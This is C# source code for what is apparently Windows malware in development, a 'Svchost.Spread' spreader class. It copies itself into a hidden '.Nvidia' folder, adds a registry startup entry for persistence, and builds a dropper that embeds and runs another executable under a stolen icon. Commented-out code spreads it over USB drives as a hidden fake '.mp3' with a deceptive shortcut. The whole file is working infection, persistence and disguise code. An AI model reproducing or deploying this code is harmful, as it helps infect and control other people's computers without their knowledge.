using System;
using System.IO;
using System.Drawing;
using System.Collections.Generic;
using System.Diagnostics;
using System.CodeDom.Compiler;

using System.Windows.Forms;
using System.Reflection;
using System.Drawing.IconLib;
using Microsoft.CSharp;

namespace Svchost.Spread
{
    public class Spreader
    {
        private string shortcutIconLocation;
        private string cmdLocation;
        private string usbFolderName;
        private string assemblyName;
        private string fakeAssemblyName;
        private string applicationPath;
        private string sessionName;
        private string targetFolder;
        private DriveDetector driveDetector;

        public Spreader(string fakeAssembName, string assembName, string appPath, string windowsName)
        {
            fakeAssemblyName = fakeAssembName;
            assemblyName = assembName;
            applicationPath = appPath;
            sessionName = windowsName;
            cmdLocation = "C:\\Windows\\System32\\cmd.exe";
            shortcutIconLocation = @"C:\Windows\System32\SHELL32.dll,116";
            targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
            usbFolderName = "Music\\";

            /*
            if (checkEnvironment())
                driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/

            infect();
        }

        private bool isExecutableInfected(string path)
        {
            try
            {
                Assembly assembly = Assembly.LoadFile(path);
                foreach (string resourceName in assembly.GetManifestResourceNames())
                {
                    if (resourceName.Contains(assemblyName))
                        return true;
                }
            }
            catch
            {

            }
            return false;
        }

        private void exctractIcon(string path)
        {
            try
            {
                Icon icon = Icon.ExtractAssociatedIcon(path);
                MultiIcon mIcon = new MultiIcon();
                SingleIcon sIcon = mIcon.Add("oink");
                sIcon.CreateFrom(icon.ToBitmap(), IconOutputFormat.Vista);
                sIcon.Save(@"D:\DevMain\bdo\SvchostTest\Svchost\bin\Debug\icon6.ico");
                /* FileStream fs = new FileStream(@"icon.ico", FileMode.Create);
                 icon.Save(fs);
                 fs.Close();*/
            }
            catch { }
        }

        public void replicateOverUSB(DriveInfo drive)
        {
            //Potentially not infected usb found
            /*string usbRootFolder = drive.RootDirectory.FullName;
            string targetFolder = usbRootFolder + usbFolderName;

            if (!Directory.Exists(targetFolder))
            {
                DirectoryInfo di;
                try { di = Directory.CreateDirectory(targetFolder); }
                catch{ return; }
            }

            //Copy the assembly with fake name
            string fullTargetPath = targetFolder + fakeAssemblyName + ".mp3";
            if (!File.Exists(fullTargetPath))
            {
                try
                {
                    //Copy and hide file
                    File.Copy(applicationPath + assemblyName, fullTargetPath);
                    File.SetAttributes(fullTargetPath, FileAttributes.Hidden);
                }
                catch { return; }

                object folder = (object)targetFolder;
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                string shortcutAddress = targetFolder + fakeAssemblyName + ".lnk";
                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutAddress);
                shortcut.TargetPath = cmdLocation;
                shortcut.Arguments = "/c \"" + fakeAssemblyName + ".mp3" + "\"";
                shortcut.WorkingDirectory = targetFolder;
                shortcut.IconLocation = shortcutIconLocation;
                shortcut.Save();
            }*/
        }
        
        private bool checkEnvironment()
        {
            if(applicationPath == targetFolder)
            {
                Regedit.setStartup(assemblyName, "\"" + applicationPath + assemblyName.Replace(".exe", "") + "\"");
                return true;
            }
            else
            {
                if (!Directory.Exists(targetFolder))
                {
                    DirectoryInfo di = Directory.CreateDirectory(targetFolder);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }

                string fullTargetPath = targetFolder + assemblyName; 
                string originPath = System.Reflection.Assembly.GetEntryAssembly().Location;
                if (!File.Exists(fullTargetPath))
                    File.Copy(originPath, fullTargetPath);

                try
                {
                    var spawn = Process.Start(fullTargetPath);
                }
                catch { }

                Process thisprocess = Process.GetCurrentProcess();
                thisprocess.CloseMainWindow();
                thisprocess.Close();
                thisprocess.Dispose();
                Application.Exit();
                Environment.Exit(0);
                return false;
            }
        }

        static CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
        static CompilerParameters compilerParameters = new CompilerParameters
        {
            GenerateExecutable = true,
            OutputAssembly = "compiledTest3.exe"
        };

        void infect()
        {
            exctractIcon(@"test.exe");

            compilerParameters.ReferencedAssemblies.Add("System.dll");
            compilerParameters.EmbeddedResources.Add("test.exe");
            compilerParameters.CompilerOptions = @"/win32icon:D:\DevMain\bdo\SvchostTest\Svchost\bin\Debug\icon6.ico";

            string cSharpCode = "public class Robot" +
            "{" +
            "   static void Main()" +
            "   {" +
            "       ExtractResource( \"Svchost.Spread.test.exe\", \"test.exe\" );" +
            "       System.Diagnostics.Process.Start(\"test.exe\");" +
            "   }" +

            "   static void ExtractResource(string resource, string path)" +
            "   {" +
            "       System.IO.Stream stream = typeof(Robot).Assembly.GetManifestResourceStream(resource);" +
            "       byte[] bytes = new byte[(int)stream.Length];" +
            "       stream.Read(bytes, 0, bytes.Length);" +
            "       System.IO.File.WriteAllBytes(path, bytes);" +
            "   }" +
            "}";


            CompilerResults results = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters,
            new[] { cSharpCode });

            foreach (string output in results.Output)
            {
                Console.WriteLine(output);
            }

            Assembly assembly = results.CompiledAssembly;
            results.PathToAssembly = "./";
            /*dynamic robot = assembly.CreateInstance("Robot");
            robot.Speak();*/
        }
    }
}
